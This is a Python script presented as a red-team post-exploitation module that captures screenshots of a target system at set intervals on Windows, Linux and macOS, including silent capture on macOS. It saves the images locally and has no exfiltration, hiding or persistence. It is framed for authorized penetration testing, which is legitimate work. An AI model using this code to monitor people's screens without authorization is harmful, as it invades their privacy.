#!/usr/bin/env python3
"""
Screenshot Capture - Post-Exploitation Module
Captures screenshots from target system at intervals
For authorized penetration testing only
"""

import os
import sys
import time
from datetime import datetime
import platform

class ScreenCapture:
    def __init__(self, output_dir='screenshots', interval=60):
        self.output_dir = output_dir
        self.interval = interval
        self.os_type = platform.system()
        self.screenshot_count = 0
        
        # Create output directory
        os.makedirs(self.output_dir, exist_ok=True)
    
    def capture_screenshot(self):
        """Capture a screenshot based on OS"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join(self.output_dir, filename)
        
        try:
            if self.os_type == "Windows":
                self.capture_windows(filepath)
            elif self.os_type == "Linux":
                self.capture_linux(filepath)
            elif self.os_type == "Darwin":
                self.capture_macos(filepath)
            
            self.screenshot_count += 1
            print(f"[+] Screenshot saved: {filepath}")
            return filepath
            
        except Exception as e:
            print(f"[!] Error capturing screenshot: {e}")
            return None
    
    def capture_windows(self, filepath):
        """Capture screenshot on Windows"""
        try:
            # Try PIL/Pillow first (more reliable)
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            screenshot.save(filepath, 'PNG')
        except ImportError:
            # Fallback to mss
            try:
                import mss
                with mss.mss() as sct:
                    sct.shot(output=filepath)
            except ImportError:
                print("[!] No screenshot library available")
                print("[!] Install with: pip install pillow mss")
    
    def capture_linux(self, filepath):
        """Capture screenshot on Linux"""
        try:
            # Try PIL/Pillow first
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            screenshot.save(filepath, 'PNG')
        except:
            try:
                # Try mss
                import mss
                with mss.mss() as sct:
                    sct.shot(output=filepath)
            except ImportError:
                # Fallback to scrot
                import subprocess
                result = subprocess.run(
                    ['scrot', filepath],
                    capture_output=True
                )
                if result.returncode != 0:
                    raise Exception("scrot failed")
    
    def capture_macos(self, filepath):
        """Capture screenshot on macOS"""
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            screenshot.save(filepath, 'PNG')
        except ImportError:
            # Use macOS screencapture command
            import subprocess
            subprocess.run(['screencapture', '-x', filepath])
    
    def continuous_capture(self, duration=None):
        """Continuously capture screenshots at intervals"""
        print(f"[*] Starting continuous screenshot capture")
        print(f"[*] Interval: {self.interval} seconds")
        print(f"[*] Output directory: {self.output_dir}")
        if duration:
            print(f"[*] Duration: {duration} seconds")
        print("[*] Press Ctrl+C to stop\n")
        
        start_time = time.time()
        
        try:
            while True:
                self.capture_screenshot()
                
                # Check duration
                if duration and (time.time() - start_time) >= duration:
                    print(f"\n[+] Capture duration reached ({duration}s)")
                    break
                
                time.sleep(self.interval)
                
        except KeyboardInterrupt:
            print(f"\n[!] Screenshot capture stopped")
        
        print(f"\n[+] Total screenshots captured: {self.screenshot_count}")
        print(f"[+] Screenshots saved in: {self.output_dir}")

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Screenshot capture for authorized pentesting')
    parser.add_argument('--output', default='screenshots', help='Output directory for screenshots')
    parser.add_argument('--interval', type=int, default=60, help='Capture interval in seconds')
    parser.add_argument('--duration', type=int, help='Total capture duration in seconds')
    parser.add_argument('--single', action='store_true', help='Capture single screenshot and exit')
    args = parser.parse_args()
    
    print("="*60)
    print("Screenshot Capture - Red Team Tool")
    print("For Authorized Penetration Testing Only")
    print("="*60 + "\n")
    
    capturer = ScreenCapture(output_dir=args.output, interval=args.interval)
    
    if args.single:
        capturer.capture_screenshot()
        print(f"[+] Single screenshot captured in: {args.output}")
    else:
        capturer.continuous_capture(duration=args.duration)

if __name__ == '__main__':
    main()
